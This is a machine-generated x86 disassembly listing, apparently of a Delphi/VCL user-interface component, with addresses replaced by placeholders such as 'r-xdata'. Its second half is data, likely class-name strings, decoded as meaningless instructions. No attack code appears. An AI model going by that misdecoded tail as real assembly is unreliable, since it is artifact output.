lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x24 ]
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
sub_4715f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
mov [ ecx ] 0xffffffff
mov [ edx ] 0xffffffff
jmp r-xdata
neg ebx
dec ebx
mov [ ecx ] ebx
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
mov esi [ ebp - 0x4 ]
mov [ ecx ] esi
dec ebx
mov [ edx ] ebx
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_471630
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4716ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
or ebx 0xffffffff
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
mov ecx r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4716c1
lea eax [ ebp - 0xc ]
call sub_404094
retn
sub_4716cf
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx ebx
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
xor eax eax
pop esi
pop ebx
pop ebp
retn
sub_471704
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jle r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x2d8 ]
call sub_470f84
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx r-xdata
mov eax [ eax + 0x10 ]
call sub_470f78
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x24 ]
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_471778
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4717b6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x4 ]
call sub_46a354
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4717bd
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_4717c0
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4715f0
cmp [ esp ] 0x0
jge r-xdata
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_471dd4
mov eax esi
call sub_404094
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_471800
mov edx [ eax + 0x14 ]
test edx edx
jne r-xdata
test edx edx
jle r-xdata
xor eax eax
retn
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x24c ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x21c ]
jmp r-xdata
retn
sub_471824
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4715f0
cmp [ esp ] 0x0
jge r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ ebx + 0x10 ]
call sub_471e18
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_471858
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_471897
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov eax [ ebp - 0x4 ]
call sub_46a354
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47189e
lea eax [ ebp - 0x4 ]
call sub_404094
retn
sub_4718a4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4715f0
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_471e44
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4718d4
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4715f0
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_471e94
pop ecx
pop edx
pop esi
pop ebx
retn
sub_471910
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46b198
mov eax esi
call sub_471c24
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_471958
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
cmp [ esi + 0x2dc ] 0x0
je r-xdata
cmp [ esi + 0x2e0 ] 0x0
je r-xdata
mov edx sub_47194c
mov eax [ esi + 0x2dc ]
call sub_470f78
mov eax [ esi + 0x2dc ]
call sub_403344
cmp [ esi + 0x2d8 ] 0x0
je r-xdata
mov edx sub_47194c
mov eax [ esi + 0x2e0 ]
call sub_470f78
mov eax [ esi + 0x2e0 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46b2e8
test bl bl
jle r-xdata
mov edx sub_47194c
mov eax [ esi + 0x2d8 ]
call sub_470f78
mov eax [ esi + 0x2d8 ]
call sub_403344
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_4719ec
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x70 ]
xor eax eax
pop esi
pop ebx
pop ebp
retn
sub_471a0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edx sub_4719ec
mov eax [ ebx + 0x2d8 ]
call sub_470f78
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_470788
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471a44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x2d8 ]
call sub_471094
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_470828
pop edi
pop esi
pop ebx
retn
sub_471a74
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_471dd4
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_471ab8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_471b67
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_471c14
xor eax eax
push ebp
push sub_471b38
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_471dd4
mov edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_4044a0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471b3f
mov eax [ ebp - 0x4 ]
call sub_471c1c
retn
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_471e44
sub_471b3f
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_470878
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471b6e
lea eax [ ebp - 0x10 ]
call sub_404094
retn
sub_471b78
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_471c04
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28c ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4708a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471c0b
lea eax [ ebp - 0x14 ]
call sub_404094
retn
mov eax [ ebp - 0xc ]
add eax 0x2
push eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_471dd4
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ ebp - 0x10 ]
add ecx 0x2
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x208 ]
call sub_41df8c
sub_471c24
push ebx
push esi
mov esi eax
cmp [ esi + 0x2e0 ] 0x0
jne r-xdata
cmp [ esi + 0x24c ] 0x100
jle r-xdata
cmp [ esi + 0x21c ] 0x200
jle r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
xor ebx ebx
mov bl 0x1
jmp r-xdata
cmp [ esi + 0x2d8 ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470e70
mov [ esi + 0x2dc ] eax
cmp [ esi + 0x2dc ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470e70
mov [ esi + 0x2e0 ] eax
pop esi
pop ebx
retn
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_470e70
mov [ esi + 0x2d8 ] eax
sub_471cd0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x2e4 ] 0x0
jne r-xdata
mov [ ebx + 0x2e5 ] 0x1
mov ecx edi
mov edx esi
mov eax ebx
call sub_46d778
jmp r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ ebx + 0x22c ]
jne r-xdata
cmp esi [ ebx + 0x228 ]
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
jne r-xdata
mov eax ebx
call sub_46b778
sub_471d1c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
cmp [ esp ] 0x0
je r-xdata
lea edi [ esi + 0x2dc ]
lea edi [ esi + 0x2e0 ]
jmp r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esp ] 0x0
je r-xdata
mov eax [ edi ]
mov edx ebp
call sub_470f84
mov ebx eax
test ebx ebx
jne r-xdata
lea eax [ ebp + 0x1 ]
mov eax ebp
neg eax
dec eax
jmp r-xdata
push eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4714b0
mov ebx eax
mov eax [ edi ]
mov ecx ebx
mov edx ebp
call sub_4710e8
sub_471d80
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_470f84
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x200
jle r-xdata
xor eax eax
mov al 0x1
jmp r-xdata
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_471160
mov esi eax
mov ecx esi
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_4710e8
sub_471dd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edx edi
mov eax [ ebx + 0x2d8 ]
call sub_470f84
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax esi
call sub_404094
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_471e18
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x2d8 ]
call sub_470f84
test eax eax
jne r-xdata
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_471e44
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471d80
mov ecx [ ebp + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx esi
mov eax ebx
call sub_471d1c
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471d1c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_471cd0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_471e94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471d80
mov ecx [ ebp + 0x8 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
mov cl 0x1
mov edx esi
mov eax ebx
call sub_471d1c
xor ecx ecx
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_471d1c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_471cd0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_471ee4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_471f09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471f10
retn
sub_471f20
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ edi ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0x47 ] dh
add [ eax + eax ] ah
add [ eax ] al
or [ edx + 0x358c0041 ] bh
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
jo r-xdata
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ edx + ebp + 0x47 ] bh
add [ ecx ] cl
push esp
inc ebx
push 0x50747261
outsb
mov eax eax
test [ edi ] bl
inc edi
add [ edi ] al
or [ ebx + eax * 2 + 0x68 ] edx
popad
jb r-xdata
add [ eax ] al
push eax
outsb
push 0x6800471f
mov edx 0x60041
or [ ebp + 0x43 ] dl
popad
outsb
jbe r-xdata
inc edi
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
jo r-xdata
add [ eax + 0x47 ] al
add [ eax ] ch
add [ eax ] al
add [ edi + ebx ] bl
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ edx + ebp + 0x47 ] bh
add [ edi ] cl
push esp
inc ebx
push 0x48747261
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ edi ] al
sub [ eax ] al
add [ eax ] al
sbb al 0x1f
jae r-xdata
pushfd
xor eax 0x35a00040
dec eax
imul esp [ esp + 0x65 ] 0x6e65506e
cmp [ eax ] ah
inc edi
add [ eax + 0x600471f ] al
add [ eax ] cl
push esp
inc ebx
popad
outsb
jbe r-xdata
adc [ eax ] al
and [ eax ] al
add bh bh
les ebp [ edx ]
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or [ ebx + 0x6d ] edx
popad
insb
insb
inc esp
outsd
je r-xdata
add [ eax ] al
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
add al bh
and [ edi ] al
sub [ eax ] al
add [ eax ] al
sbb al 0x1f
inc edi
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ edx + ebp + 0x47 ] bh
add [ esi ] cl
push esp
inc esp
outsd
je r-xdata
inc eax
add al bh
xor al [ eax ]
jo r-xdata
xchg esp eax
xor eax 0x32dc0040
jae r-xdata
add [ eax + 0x7c00414a ] ah
sub al [ edi ]
andps xmm0 [ ebx + 0x68 ]
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ ecx ] ah
add [ eax ] al
push [ eax + 0x100472a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax 0x69560700
jae r-xdata
inc eax
add al al
and [ edi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc edi
jb r-xdata
add [ eax ] dl
inc eax
add [ ecx ] ah
add [ eax ] al
push [ eax + 0x100472a ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x69560700
jae r-xdata
add [ eax ] al
adc [ eax ] al
and [ eax ] eax
add bh bh
mov al 0x2a
inc edi
add [ ecx ] al
imul esp [ esp + 0x65 ] 0x6e65506e
dec eax
pop eax
and [ edi ] al
pop es
andps xmm0 [ ebx + 0x68 ]
popad
jb r-xdata
outsb
push eax
outsb
bound ebp [ ebp - 0x75 ]
sar [ eax ] 0x20
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x20 ] bl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc edi
add [ edx ] 0x0
add [ eax ] al
jns r-xdata
outsb
bound ebp [ ebp - 0x14 ]
and [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x21
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and [ edi ] eax
sub [ eax ] al
add [ eax ] al
sbb al 0x1f
inc edi
add [ ebp + esi + 0x35980040 ] cl
inc eax
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ edx + ebp + 0x47 ] bh
add [ esp + edx * 2 ] cl
inc esp
popad
jb r-xdata
add al [ eax ]
add eax 0x6c797453
mov ah 0xd7
inc ecx
add [ edi + edx * 8 + 0x10041 ] bh
add [ eax ] al
add [ eax ] al
add [ eax + 0x2 ] al
nop
or al 0x21
inc edi
add [ edi ] al
push cs
push esp
inc esp
outsd
je r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
and [ edi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
jns r-xdata
add [ edx + 0x47 ] bh
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ edx + ebp + 0x47 ] bh
add [ esi ] cl
push esp
inc ebx
push 0x41747261
jb r-xdata
inc edi
add [ eax ] al
jns r-xdata
lea eax [ eax ]
shl [ ecx ] 0x47
add [ eax ] al
add [ 0x6c797453 ] al
outsb
in al dx
and [ edi ] al
sbb [ edi ] 0x47
add [ esi ] al
add [ eax ] cl
push esp
inc ebx
popad
outsb
jbe r-xdata
xor [ ebx ] ah
inc edi
add [ eax ] ch
add [ eax ] al
add [ edi + ebx ] bl
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4722 ] dl
outsb
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
jae r-xdata
inc edi
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
add [ eax ] dh
and eax [ edi ]
sub [ eax ] al
add [ eax ] al
sbb al 0x1f
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ edx + ebp + 0x47 ] bh
add [ 0x61684354 ] cl
jb r-xdata
and eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and eax [ edi ]
add [ eax ] al
outsb
nop
nop
and al [ edi ]
pop es
push cs
push esp
inc ebx
push 0x41747261
jb r-xdata
popad
inc edi
add [ edi ] al
or al 0x54
inc esp
popad
jb r-xdata
mov ah 0x41
add [ eax - 0x3fffbe2a ] bh
salc
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8080 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ esp + esi * 4 + 0x41 ] ah
add [ eax + eax ] bh
inc ecx
js r-xdata
inc eax
xor eax 0x35a00040
outsd
ja r-xdata
mov ah 0x41
add [ eax - 0x3fffbe2a ] bh
salc
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x8080 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ esp + esi * 4 + 0x41 ] ah
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
inc edi
jb r-xdata
mov dh 0x41
add [ edi + edx * 8 - 0x2843ffbf ] dh
inc ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ecx
add [ eax - 0x5fffbeb6 ] bl
dec edx
inc ecx
add [ eax + 0xe00472d ] ch
push esp
push esi
imul esp [ ebp + 0x77 ] 0x704f4433
je r-xdata
inc ecx
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add al ah
and eax [ edi ]
cmp al 0x0
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jo r-xdata
inc eax
add al bh
xor al [ eax ]
jo r-xdata
fdiv [ edx ]
jo r-xdata
add [ edi + ebx ] bl
jns r-xdata
add [ eax ] eax
or ecx [ eax + 0x6f ]
jb r-xdata
outsd
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
outsb
mov eax eax
inc esp
and eax [ edi ]
pop es
or eax 0x61684354
jb r-xdata
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
inc edi
add [ eax + 0x600471f ] al
add [ eax ] cl
push esp
inc ebx
popad
outsb
jbe r-xdata
inc edi
add [ ebp + esi + 0x35980040 ] cl
inc eax
add [ ebp + esi + 0x35a00040 ] bl
sub [ eax ] al
add [ eax ] al
sbb al 0x1f
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
outsb
shl [ ecx ] 0x47
add [ eax + 0x600471f ] al
add [ eax ] cl
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax + eax ] al
jpe r-xdata
add eax [ eax ]
add eax 0x74646957
push r-xdata
hlt
inc eax
add al bh
mov al [ 0xffffffff94004035 ]
inc ecx
js r-xdata
xor al [ eax ]
jo r-xdata
add ah bl
xor al [ eax ]
inc eax
add [ ebx ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
xor al [ eax ]
jo r-xdata
jae r-xdata
clc
add [ eax ] ch
add [ eax ] al
inc edi
inc eax
add al bh
xor eax 0x32dc0040
jae r-xdata
add [ edx + ebx * 2 ] al
outsd
outsd
insd
add [ eax ] dl
inc eax
add [ eax + eax ] ah
je r-xdata
or [ edx + 0x6f ] dl
push esp
adc [ eax ] al
adc al 0x0
add bh bh
or [ 0x10047 ] ch
add [ eax ] al
add [ eax ] al
add [ eax + 0x159 ] al
add al 0x0
jae r-xdata
xor eax 0x32dc0040
cwde
xor eax 0x359c0040
inc eax
add [ eax - 0x6bffbfcb ] ah
jae r-xdata
mov ah 0x41
add [ eax - 0x3fffbe2a ] bh
salc
inc ecx
add [ ecx ] al
add [ eax ] al
add [ esp + esi * 4 + 0x41 ] ah
inc esi
nop
pop esp
and eax 0x12030047
push esp
add bh bh
pushfd
sub eax 0x10047
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and al 0x0
outsd
outsb
push esp
adc [ eax ] al
sbb [ eax ] al
add bh bh
adc al 0x2d
inc edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x69540400
insb
je r-xdata
je r-xdata
add [ eax ] cl
push edx
outsd
je r-xdata
add [ eax ] al
outsb
and al 0x23
inc edi
add [ eax + 0x600471f ] al
add [ eax ] cl
push esp
inc ebx
popad
outsb
jbe r-xdata
sub eax [ eax ]
xor [ ebx ] ch
insd
inc edx
outsd
je r-xdata
jo r-xdata
imul esp [ fs : ebp + 0x6e ] 0x72694474
or [ eax ] al
or [ edx + 0x6f ] bl
outsd
insd
push esp
js r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc [ eax ] al
sbb al 0x0
add bh bh
inc esp
sub eax 0x10047
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al 0x0
add bh bh
push 0x100472d
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
or cl [ edi + 0x72 ]
je r-xdata
xor al [ eax ]
mov [ ecx + 0x41 ] cl
inc eax
add ah bl
xor al [ eax ]
clc
jae r-xdata
add [ eax ] dh
sub eax [ eax ]
xor [ ebx ] ch
